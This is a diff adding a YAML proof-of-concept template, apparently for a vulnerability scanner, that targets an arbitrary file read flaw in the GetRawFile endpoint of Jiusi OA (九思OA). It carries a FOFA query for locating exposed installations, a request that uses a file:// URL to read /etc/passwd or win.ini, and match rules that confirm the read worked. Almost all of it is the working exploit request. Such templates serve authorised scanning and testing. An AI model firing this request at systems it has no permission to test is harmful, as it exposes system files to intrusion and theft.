@@ -1,0 +1,33 @@
+id: poc-yaml-jiusi-getrawfile-anyfile-read
+info:
+  name: 九思OA GetRawFile 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 九思OA
+  fofa: app="九思软件-OA"
+variables:
+  paths: 'C:/windows/win.ini
+
+    etc/passwd
+
+    '
+requests:
+- method: GET
+  path: /jsoa/GetRawFile?url=file:///{{.paths}}
+  expression: '(status_code == 200 && !contains(body,"<"))
+
+    &&
+
+    (
+
+    (contains(body,"root:") && contains(body,"/bin"))
+
+    ||
+
+    (contains(body,"[files]") && contains(body,"bit app support"))
+
+    )
+
+    '
+transport: http
